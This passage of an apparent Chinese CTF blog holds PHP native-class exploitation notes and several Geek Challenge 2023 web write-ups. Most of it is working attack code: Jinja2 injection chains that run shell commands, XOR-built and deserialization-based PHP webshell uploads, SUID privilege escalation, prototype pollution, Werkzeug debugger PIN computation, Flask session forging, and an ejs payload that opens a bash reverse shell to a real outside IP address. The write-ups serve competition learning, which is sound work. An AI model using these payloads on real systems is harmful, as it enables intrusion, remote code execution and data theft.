xmlns:ns1=&quot;aaab&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 成功控制 使用SoapClient反序列化+CRLF可以生成任意POST请求。 1Deserialization + __call + SoapClient + CRLF = SSRF SoapClient__Examplectfshow_web259 hint： 1234567891011121314#flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1'){ die('error');}else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); }} 源码： 123456789#index.php&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET['vip']);//vip can get flag one key$vip-&gt;getFlag(); 目的是在index.php通过反序列化一个原生类向flag.php发送请求，然后flag.php用file_put_contents把flag放到flag.txt里 exp 1234567891011&lt;?php$target = 'http://127.0.0.1/flag.php';$post_string = 'token=ctfshow';$b = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;'zIxyd^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'. '^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string, 'uri'=&gt; &quot;zIxyd&quot;));$a = serialize($b);$a = str_replace('^^',&quot;\\r\\n&quot;,$a);echo urlencode($a);?&gt; ZipArchive 类来删除文件 适用于PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0 一个用 Zip 压缩的文件存档。 可以通过本类执行一些文件操作，在CTF可以用来删除waf 常用类方法： 12345678ZipArchive::addEmptyDir：添加一个新的文件目录ZipArchive::addFile：将文件添加到指定zip压缩包中ZipArchive::addFromString：添加新的文件同时将内容添加进去ZipArchive::close：关闭ziparchiveZipArchive::extractTo：将压缩包解压ZipArchive::open：打开一个zip压缩包ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除 实例代码： 1234&lt;?php$zip = new ZipArchive;$zip-&gt;open('filename', ZipArchive::CREATE)?&gt; 该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。 12345678filename：要打开的ZIP存档的文件名。flags：用于打开档案的模式。有以下几种模式：ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。ZipArchive::CREATE：如果不存在则创建一个zip压缩包。ZipArchive::RDONLY：只读模式打开压缩包。ZipArchive::EXCL：如果压缩包已经存在，则出错。ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到cons ZipArchive_Example新建一个waf.txt文件，内容如下 1this_is_test 新建一个test.php文件，内容如下 1234567891011121314151617181920212223242526272829&lt;?phphighlight_file(__FILE__);error_reporting(0);class zIxyd { public $object; public $filename; public $content; public $code; public function __destruct() { echo &quot;Can you hack me?&quot;; $this-&gt;object-&gt;open($this-&gt;filename,$this-&gt;content); if(!file_get_contents(&quot;waf.txt&quot;)){ eval($this-&gt;code); }else{ echo file_get_contents(&quot;waf.txt&quot;); } }}$code = $_POST['code'];if(isset($code)){ unserialize($code);}else{ echo &quot;Please input your code&quot;;} 代码很明显，只有不存在waf.txt文件，即可rce; 存在open函数，通过ZipArchive直接调用open方法删除目标机上的文件 poc: 12345678910111213141516&lt;?phpclass zIxyd { public $object; public $filename; public $content; public $code;}$a = new zIxyd();$a -&gt;object = new ZipArchive();$a -&gt;filename = &quot;waf.txt&quot;;$a -&gt;content = ZipArchive::OVERWRITE;$a -&gt;code = &quot;phpinfo();&quot;;echo serialize($a);","link":"/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"},{"title":"Geek Challenge 2023","text":"前言记录一些在Geek Challenge 2023比赛中的wp；一部分写的比较详细，一部分写的比较简单，根据题目的难易度来的； klf_2源码再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下 1234567891011121314151617181920212223242526272829from flask import Flask, request, render_template, render_template_string,send_from_directoryimport re import os app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') @app.route('/secr3ttt', methods=['GET', 'POST']) def secr3t(): klf = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;别找了，这次你肯定是klf&lt;/h1&gt; &lt;/body&gt; &lt;img src=&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian- blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg&quot; alt=&quot;g&quot;&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/html&gt; &lt;!--klf?--&gt; &lt;!-- 别想要flag？klf --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45', for i in bl: if i in klf: return render_template('klf.html') a = render_template_string(template % klf) if &quot;{&quot; in a: return a + render_template('win.html') return a @app.route('/robots.txt', methods=['GET']) def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=7889, debug=False 黑名单过滤了一大部分关键字和关键符号。但是没有.，join过滤器，dict，= ，()，set,|,attr.还是有机可乘的 构造关键字这一部分就是构造出关键字 1().__class__.__base__.__subclasses__().__getitem__(xx).__init__.__globals__['popen'](xx).read() 12345678910{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%} 构造cmd再上一步的基础上，构造ls： 123456789101112131415{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set ls=dict(l=a,s=b)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(ls)|attr(re)())%}#app.py hahahaha requirements.txt static templates 看到flag没有再当前目录下，尝试构造 ls /,这时候就需要在上一步的基础上，需要构造空格和反斜杠字符 ,/, 构造空格空格很容易构造，在()|select|string|list)就有许多空格，,这里大概解释一下**()|select|string|list)**这种形式是什么意思，管道符，前一个输出当作后一个输入，就像list(string(select(()))) 构造反斜杠思路一()|select|string|list)中没有反斜杠，那么就想一下：还有其他关键字可以以这种形式构造字符吗？，而其他关键字构造的字符下可能有我们需要的反斜杠，答案是肯定的 还有很多 config|string|list request|string|list lipsum|string|list …… 比如config和request下就有反斜杠，但是被黑名单了，我这里暂时还没有找到其他不太黑名单下有可以构造反斜杠的，只能换思路了 思路二利用格式字符串得到反斜杠， 1234{%set fxg=(&quot;%c&quot;%(47))%}{%print(fxg)%}#/ 要利用格式字符串需要用到百分号，那么需要构造百分号:将字符url编码取第一个字符，第一个字符肯定是%, 1{% set bfh = ()|select|string|urlencode|first %} 而然并没有我想的那么简单，url居然被过滤了，这种思路又无法用了 思路三回顾一下， 我们是想要得到反斜杠； 我们已经可以在当前目录下执行命令了，上面展示的就有ls； 突然想起来当前目录有app.py文件，用的是flask框架，肯定会有路由，有路由肯定会用到反斜杠;现在思路比较简单了：从app.py文件中得到反斜杠； 列如下段flask代码中肯定会存在反斜杠： 123@app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') 需要cat app.py,字母和空格都有了，现在构造.又成了一个难点，但还是有方法的 12345678{%print(g)%}#&lt;flask.g of 'app'&gt;{% set po=dict(po=a,p=b)|join%} {% set dian=(g|string|list)|attr(po)(6)%}{%print(dian)%}#. ok，这样所需要的字符都构造出来了，剩下的就是利用了 exp123456789101112131415161718192021222324252627{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)())%} EzRce123456789101112&lt;?phpinclude('waf.php');session_start();show_source(__FILE__);error_reporting(0);$data=$_GET['data'];if(waf($data)){ eval($data);}else{ echo &quot;no!&quot;;}?&gt; 先用bp fuzz一下，看看过滤了什么，发现异或符号没有过滤，而且有几个字母没有过滤 下面是上了木马才得到源码的 12345678910&lt;?phpfunction waf($data){ if(preg_match('/[b-df-km-uw-z0-9\\+\\~\\{\\}]+/i',$data)){ return False; }else{ return True; }} 异或上🐎因为没有过滤异或所以构造phpinfo(); : (“^@^@@[@”^”.(.).=/“)(); 发现是可以成功显示phpinfo内容，但是查看disable_functions禁用了一些函数，但是没有禁用file_put_contents函数，尝试写一句话木马上去 123file_put_content(&quot;lll.php&quot;,&quot;&lt;?php eval($_POST[1])?&gt;&quot;)(&quot;AAAAaL*VaAAAVAAVL&quot;^&quot;'(-$&gt;&lt;_\\&quot;&gt;\\&quot;./\\&quot;$/\\&quot;?&quot;)(&quot;lll&quot;.&quot;.&quot;.(&quot;LAL&quot;^&quot;&lt;)&lt;&quot;),(&quot;aaLALaaAVAAvaalalvelaleaa&quot;^&quot;]^&lt;)&lt;A!$ -^E&gt;&lt;.?\\&quot;&gt;]&lt;E^^_&quot;)); 发现也是成功上传了木马，用蚁剑连shell(这里有一个坑,https没有成功，用http代替就可以了) 提权可以看到flag就在根目录下，但是没有权限读取，whoami 查看当前用户www-data，去网上搜一次关于提权的知识， 提权的方法有很多，这道题考的是find提权， 123456789which find #/usr/bin/findls /usr/bin/find -l#-rwsr-xr-x. 1 root root 315904 Feb 16 2019 /usr/bin/find#这里发现有s权限 s:suodsetuid：该位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令 find /etc/passwd -exec cat /flag \\; #find 一个必须存在的文件 -exec 有执行的命令 \\; 到这里flag就已经到手了，踩了很多坑，还有一些坑没有写上了，也是拿了一个三血，下面是异或的脚本 123456789101112131415valid = &quot;alevALEV!@$%^*()[];\\'\\&quot;,.&lt;&gt;/?-=_` &quot;answer = str(input(&quot;请输入进行异或构造的字符串：&quot;))# answer = &quot;//\\/\\/&quot;tmp1, tmp2 = '', ''for c in answer: for i in valid: for j in valid: if (ord(i) ^ ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue break ezpython源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import jsonimport osfrom waf import wafimport importlibfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_stringapp = Flask(__name__)app.secret_key='jjjjggggggreekchallenge202333333'class User(): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot; self.isvip=Falseclass hhh(User): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot;registered_users=[]@app.route('/')def hello_world(): # put application's code here return render_template(&quot;welcome.html&quot;)@app.route('/play')def play(): username=session.get('username') if username: return render_template('index.html',name=username) else: return redirect(url_for('login'))@app.route('/login',methods=['GET','POST'])def login(): if request.method == 'POST': username=request.form.get('username') password=request.form.get('password') user = next((user for user in registered_users if user.username == username and user.password == password), None) if user: session['username'] = user.username session['password']=user.password return redirect(url_for('play')) else: return &quot;Invalid login&quot; return redirect(url_for('play')) return render_template(&quot;login.html&quot;)@app.route('/register',methods=['GET','POST'])def register(): if request.method == 'POST': try: if waf(request.data): return &quot;fuck payload!Hacker!!!&quot; data=json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;连用户名密码都没有你注册啥呢&quot; user=hhh() merge(data,user) registered_users.append(user) except Exception as e: return &quot;泰酷辣,没有注册成功捏&quot; return redirect(url_for('login')) else: return render_template(&quot;register.html&quot;)@app.route('/flag',methods=['GET'])def flag(): user = next((user for user in registered_users if user.username ==session['username'] and user.password == session['password']), None) if user: if user.isvip: data=request.args.get('num') if data: if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: flag = os.environ.get('geek_flag') return render_template('flag.html',flag=flag) else: return &quot;你的数字不对哦!&quot; else: return &quot;I need a num!!!&quot; else: return render_template_string('这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;{{url_for(\\'static\\',filename=\\'weixin.png\\')}}&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;') else: return &quot;先登录去&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)if __name__ == '__main__': app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;) 考察原型链污染和python的int函数漏洞，其实int不止在python里有这个漏洞，其他语言也有，比如php也有； 标志着原型链污染 1234567891011def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 虽然代码一共有100多行，但是整个代码的逻辑和实现的功能是非常简单易懂的 使得hhh类的isvip为真，但是hhh没有isvip属性，很明显就是需要污染hhh类， example先看一个python原型链污染的简单案例吧 1234567891011121314151617181920212223242526272829303132333435363738394041class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret)#hahaprint(instance.secret)#hahamerge(payload, instance)print(son_a.secret)#no wayprint(instance.secret)#no way pollute然后下面是我自己本地测试的结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import jsonclass User(): def __init__(self): self.username=&quot;aa&quot; self.password=&quot;bb&quot; self.isvip=0class hhh(User): def __init__(self): self.username=&quot;cc&quot; self.password=&quot;dd&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)user = hhh()#payload = '''{&quot;username&quot;: &quot;test&quot;,&quot;password&quot;: &quot;test002&quot;,&quot;\\u0069\\u0073\\u0076\\u0069\\u0070&quot; : &quot;111&quot;}'''payload = json.loads(payload)print(payload)print(user.username)print(user.password)merge(payload, user)print(user.username)print(user.password)print(user.isvip) 这里用unicode编码绕过waf，json.load会自动进行unicode解码， 绕后就是绕过 1if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: 这里比较简单了用空格或者字符“+”或者0，这里将0禁止了用前面两者就行， 123?=%20123456789或者?=+123456789 雨根据hint secret_key是出题人的id:VanZY(我当时没看hint，用脚本也可以爆破出来)，然后伪造jwt，得到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const express = require('express');const jwt = require('jsonwebtoken');const app = express();const bodyParser = require('body-parser')const path = require('path');const jwt_secret = &quot;VanZY&quot;;const cookieParser = require('cookie-parser');const putil_merge = require(&quot;putil-merge&quot;)app.set('views', './views');app.set('view engine', 'ejs');app.use(cookieParser());app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())var Super = {};var safecode = function (code){ let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig; return !validInput.test(code);};app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, {deep:true}); } res.send(&quot;welcome to code&quot;);});app.all('/hint', (req, res) =&gt; { res.type('html'); res.send(&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;);});app.get('/source', (req, res) =&gt; { res.type('html'); var auth = req.cookies.auth; jwt.verify(auth, jwt_secret , function(err, decoded) { try{ if(decoded.user==='admin'){ res.sendFile(path.join(__dirname + '/index.js')); }else{ res.send('you are not admin &lt;!--Maybe you can view /hint--&gt;'); } } catch{ res.send(&quot;Fuck you Hacker!!!&quot;) } });});app.all('/create', (req, res) =&gt; { res.type('html'); if (!req.body.name || req.body.name === undefined || req.body.name === null){ res.send(&quot;please input name&quot;); }else { if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); }else { if (!safecode(req.body.name)) { res.send(&quot;你在做什么？快停下！！！&quot;) } else{ res.render('index', {name: req.body.name}); } } }});app.get('/',(req, res) =&gt; { res.type('html'); var token = jwt.sign({'user':'guest'},jwt_secret,{ algorithm: 'HS256' }); res.cookie('auth ',token); res.end('Only admin can get source in /source');});app.listen(3000, () =&gt; console.log('Server started on port 3000')); 代码比较简单，一看就是需要某种权限才能执行某些命令，nodejs原型链污染的老套路了 12if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); 在这里，需要Super[‘userrole’]的值为Superadmin，但是整个代码也没有涉及到可以让Super[‘userrole’]的值为Superadmin的地方，但是凭空多出来一个code路由，putil_merge函数和merge函数，基本可以确定这里有问题了 1234567app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, {deep:true}); } res.send(&quot;welcome to code&quot;);}); 上网搜索putil_merge函数，发现确实存在原型链污染 123456const putil_merge = require('putil-merge');const payload = JSON.parse('{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;polluted&quot;: &quot;yes&quot;}}}');let obj = {};console.log(&quot;Before:&quot; + {}.polluted)putil_merge(obj, payload, { deep: true });console.log(&quot;After:&quot; + {}.polluted) 改成 要改成application/json 1GET :/code 1POST:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;userrole&quot;: &quot;Superadmin&quot;}}} 将Super[‘userrole’]的值改为Superadmin，就有权限执行： 1res.render('index', req.body); 这里是一个cve，可以参考这位大佬 影响版本：ejs &lt;= v3.1.9 （最新版本 123456789{&quot;name&quot;:&quot;abc&quot;, &quot;settings&quot;:{ &quot;view options&quot;:{ &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require('child_process').execSync(\\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1'\\&quot;);&quot;, &quot;client&quot;:&quot;true&quot; } }} ez_remove1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);class syc{ public $lover; public function __destruct() { echo $this-&gt;lover; echo &quot;daozhel&quot;; eval($this-&gt;lover); }}if(isset($_GET['web'])){ if(!preg_match('/lover/i',$_GET['web'])){ $a=unserialize($_GET['web']); throw new Error(&quot;快来玩快来玩~&quot;); } else{ echo(&quot;nonono&quot;); }}?&gt; 利用十六进制要绕过正则匹配 1lover ==&gt; \\6cover 利用gc回收绕过异常 1O:3:&quot;syc&quot;:1 ==&gt; O:3:&quot;syc&quot;:2 写入一句话木马，这里需要注意的是要将小写s转变大写S ,才能解析十六进制 1?web=O:3:&quot;syc&quot;:2:{S:5:&quot;\\6cover&quot;;s:53:&quot;file_put_contents('2.php','&lt;?php @eval($_POST[1]);');&quot;;} 写入木马 ，发现无法正常执行shell命令，读取phpinfo查看disable_functions 发现禁用了函数system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen 还有open_basedir: /var/www/html/ 绕过open_basedir: ini_set用来设置php.ini的值，无需打开php.ini文件，就能修改配置 1mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');show_source(&quot;f1ger&quot;); ez_path(os.path.join)pyc在线反汇编 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# uncompyle6 version 3.8.0# Python bytecode 3.6 (3379)# Decompiled from: Python 3.7.0 (default, Nov 25 2022, 11:07:23) # [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]# Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py# Compiled at: 2023-08-26 01:33:29# Size of source mod 2**32: 2076 bytesimport os, uuidfrom flask import Flask, render_template, request, redirectapp = Flask(__name__)ARTICLES_FOLDER = 'articles/'articles = []class Article: def __init__(self, article_id, title, content): self.article_id = article_id self.title = title self.content = contentdef generate_article_id(): return str(uuid.uuid4())@app.route('/')def index(): return render_template('index.html', articles=articles)@app.route('/upload', methods=['GET', 'POST'])def upload(): if request.method == 'POST': title = request.form['title'] content = request.form['content'] article_id = generate_article_id() article = Article(article_id, title, content) articles.append(article) save_article(article_id, title, content) return redirect('/') else: return render_template('upload.html')@app.route('/article/&lt;article_id&gt;')def article(article_id): for article in articles: if article.article_id == article_id: title = article.title sanitized_title = sanitize_filename(title) article_path = os.path.join(ARTICLES_FOLDER, sanitized_title) with open(article_path, 'r') as (file): content = file.read() return render_template('articles.html', title=sanitized_title, content=content, article_path=article_path) return render_template('error.html')def save_article(article_id, title, content): sanitized_title = sanitize_filename(title) article_path = ARTICLES_FOLDER + '/' + sanitized_title with open(article_path, 'w') as (file): file.write(content)def sanitize_filename(filename): sensitive_chars = [ ':', '*', '?', '&quot;', '&lt;', '&gt;', '|', '.'] for char in sensitive_chars: filename = filename.replace(char, '_') return filenameif __name__ == '__main__': app.run(debug=True)# okay decompiling /tmp/65448aefd10b0.pyc 代码比较简单，就一个写和看的功能 漏洞点在：os.path.join函数没有对路径做很好的处理，将最后一个反斜杠看作路径的开头，所以可以任意文件泄露 然后发现debug=True，那思路就很明显了，通过os.path.join函数泄露文件计算pin码 123456789101112131415161718192021222324252627282930313233343536373839404142434445# sha1import hashlibfrom itertools import chainprobably_public_bits = [ 'root' # /etc/passwd 'flask.app', # 默认值 'Flask', # 默认值 '/usr/local/lib/python3.9/site-packages/flask/app.py' # 报错得到]private_bits = [ '37782193255385', # /sys/class/net/eth0/address 16进制转10进制 '31e70710-1d09-4cda-bc57-a7a012a89ef7docker-8037c9ea09717214042823e30fbac73b8ffa9c2671fad321c717e11489690a6b.scope' # /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) you konw flask?robots.txt泄露了3ysd8.html 访问3ysd8.html得到： 1&lt;!-- key是 app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) --&gt; 1234567import base64with open(&quot;dict.txt&quot;, &quot;w&quot;) as fp: for i in range(1, 100): original_string =str(i) byte_data = original_string.encode('utf-8') encoded_data = base64.b64encode(byte_data).decode('utf-8') fp.write('&quot;wanbao'+encoded_data + 'wanbao&quot;\\n') 12345PS D:\\Project&gt; flask-unsign --unsign --cookie &quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0IiwidXNlcl9pZCI6Mn0.ZUoT_Q.rZAY3c8K33S38x_AydOHdOh4ozQ&quot; --wordlist ./test/ctf_web/dict.txt[*] Session decodes to: {'is_admin': False, 'name': 'test', 'user_id': 2}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 99 attempts'wanbaoMzU=wanbao' 12python3 flask_session_cookie_manager3.py encode -s &quot;wanbaoMzU=wanbao&quot; -t &quot;{'is_admin': True, 'name': 'admin', 'user_id': 1}&quot; #eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ZUoU3g.xvaYWmDWnhze2kXQpN0BTWOBuqY Pupyy_rce(无参RCE)1print_r(scandir(current(localeconv()))); flag.php文件在中间，不能像平常一样 通过unlink使得flag.php是倒数第二个文件在读取就ok了 1234unlink(end(scandir(current(localeconv()))));unlink(end(scandir(current(localeconv()))));unlink(next(array_reverse(scandir(current(localeconv())))));show_source(next(array_reverse(scandir(current(localeconv()))))); 补充： 有几率可以查看根目录，strrev(crypt(serialize(array())))所获得的字符串第一位有几率是/ 1print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))); 参考 ez_php源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(0);show_source(__FILE__);include('key.php');include('waf.php');class Me { public $qwe; public $bro; public $secret; public function __wakeup() { echo(&quot;进来啦&lt;br&gt;&quot;); $characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret){ $bb = $this-&gt;qwe; return $bb(); } else{ echo(&quot;错了哥们,再试试吧&lt;br&gt;&quot;); } }}class her{ private $hername; private $key; public $asd; public function __invoke() { echo(&quot;好累，好想睡一觉啊&lt;br&gt;&quot;); serialize($this-&gt;asd); } public function find() { echo(&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === 'vxvx') { echo(&quot;解密成功！&lt;br&gt;&quot;); $file=$_GET['file']; if (isset($file) &amp;&amp; (file_get_contents($file,'r') === &quot;loveyou&quot;)) { echo(&quot;快点的，急急急！！！&lt;br&gt;&quot;); echo new $_POST['ctf']($_GET['fun']); } else{ echo(&quot;真的只差一步了！&lt;br&gt;&quot;); } } else{ echo(&quot;兄弟怎么搞的？&lt;br&gt;&quot;); } }}class important{ public $power; public function __sleep() { echo(&quot;睡饱了，接着找！&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; }}class useless { private $seeyou; public $QW; public $YXX; public function __construct($seeyou) { $this-&gt;seeyou = $seeyou; } public function __destruct() { $characters = '0123456789'; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match('/key\\.php\\/*$/i', $_SERVER['REQUEST_URI'])){ if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80){ $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random==='newbee'; if($bool){ echo(&quot;快拿到我的小秘密了&lt;br&gt;&quot;); $a = isset($_GET['a'])? $_GET['a']: &quot;&quot; ; if(!preg_match('/HTTP/i', $a)){ echo (basename($_SERVER[$a])); 